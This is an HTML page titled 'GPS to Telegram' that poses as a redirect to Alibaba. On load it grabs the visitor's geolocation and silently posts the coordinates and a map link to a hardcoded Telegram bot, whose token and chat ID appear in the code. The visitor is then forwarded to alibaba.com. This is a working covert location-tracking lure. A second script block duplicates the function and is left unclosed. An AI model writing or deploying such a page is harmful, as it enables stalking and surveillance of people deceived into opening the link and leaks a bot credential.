<!DOCTYPE html>
<html>
  <head>
     <meta http-equiv="refresh" content="3;url=https://alibaba.com">
    <title>GPS to Telegram</title>
    <script>
    
      const botToken = "8995044728:AAGgpbzLojpY9JtbP5ccigc3WuliHvVEqAQ"; // <-- Replace with your Bot token
      const chatId = "8401907837"; // <-- Replace with your Chat ID

      function sendLocation(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const accuracy = position.coords.accuracy;

        const message = `📍 New Location:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy} meters\nhttps://maps.google.com/?q=${lat},${lon}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        })
        .then(() => {
          document.body.innerHTML = "<h2 style='color:blue;'>Redirecting to Alibaba</h2>";
        })
        .catch(err => {
          console.error(err);
          document.body.innerHTML = "<h2 style='color:red;'>❌ Failed to send to Telegram</h2>";
        });
      }

      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(sendLocation, () => {
            document.body.innerHTML = "<h2 style='color:red;'>❌ Permission Denied</h2>";
          });
        } else {
          document.body.innerHTML = "<h2>❌ Geolocation not supported</h2>";
        }
      }

      window.onload = getLocation;
    </script>
  </head>
  <body>
     <button onclick="getLocation()">Allow Location</button>

    <script>
        function getLocation() {
            if (!navigator.geolocation) {
                alert("Your browser does not support location access.");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    // Location successfully obtained
                    console.log("Latitude:", position.coords.latitude);
                    console.log("Longitude:", position.coords.longitude);

                    // Continue after permission
                    window.location.href = "https://www.alibaba.com/";
                },

                function(error) {
                    if (error.code === 1) {
                        alert("Please allow location access to continue.");
                    } else {
                        alert("Unable to get your location.");
                    }
                }
            );
        }
  </body>
</html>
